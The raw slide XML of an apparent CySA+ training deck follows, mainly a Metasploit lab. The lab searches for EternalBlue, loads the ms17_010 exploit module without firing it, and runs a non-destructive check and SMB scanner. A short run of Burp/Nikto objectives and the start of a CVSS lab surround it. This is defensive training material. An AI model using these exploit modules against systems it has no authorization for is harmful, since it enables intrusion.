              <a:t>•  Run a Nikto scan and read its prefixed OSVDB/CVE references.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Install Burp Suite Community and route browser traffic through it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Intercept, modify, and replay HTTP requests with Repeater.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Fuzz a parameter with Intruder and interpret length/status diff.</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603</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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15 — Metasploit Framework Basics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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will use the Metasploit Framework (MSF) as an analyst — not to break systems but to validate that a vulnerability scanner finding is actually exploitable, which is the heart of CySA+ 2.3 (Validation — true positive/negative, Exploitability/weaponization) and 2.2 (Multipurpose — MSF, Nmap, Recon-ng).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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604</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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15 — Reference Diagram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g_2b6565e960.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1984970"/>
            <a:ext cx="10634472" cy="4031060"/>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605</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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15 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install Metasploit Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>msfdb init sets up the Postgres backend so search and host tracking work.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y metasploit-framework</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Launch the console</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-q skips the banner.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msfconsole -q</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Search for an exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Imagine your OpenVAS report flagged EternalBlue (CVE-2017-0144) on a Windows host.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; search eternalblue</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Configure and stage (do not run — analyst view)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>check is the safe analyst command: it probes the target and reports vulnerable / not vulnerable without firing the exploit.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Use an auxiliary scanner instead of an exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Many MSF modules are non-destructive scanners:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</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606</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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15 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Browse useful module families</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2015109"/>
            <a:ext cx="3977639" cy="5486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52360" y="2015109"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; search type:auxiliary scanner</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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2923794"/>
            <a:ext cx="91440" cy="101269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005840" y="3201543"/>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3201543"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Workspaces and reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>db_nmap runs Nmap and stores results in the Postgres DB.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3155823"/>
            <a:ext cx="3977639" cy="5486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52360" y="3155823"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; workspace -a customer_x</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Map MSF activity to CySA+ exploitability/weaponization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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005840" y="5482971"/>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05840" y="5482971"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Exit cleanly</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5437251"/>
            <a:ext cx="3977639" cy="5486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452360" y="5437251"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ msf6 &gt; exit</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 3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34" name="TextBox 3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5" name="TextBox 3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607</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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15 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Install Metasploit and search for an exploit by name or CVE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Configure a module, set RHOST/LHOST/PAYLOAD, and run a non-destructive check.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use auxiliary scanners to validate scanner findings at scale.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Persist findings via the MSF database and export them.</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608</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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16 — CVSS Scoring and Prioritization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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will score three vulnerabilities with the FIRST CVSS v3.1 calculator, apply environmental context, and produce a prioritised remediation list. This is exam-blueprint CySA+ 2.3 (CVSS interpretation, Context awareness, Asset value, Zero-day).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Web — FIRST CVSS v3.1 Calculator</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609</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

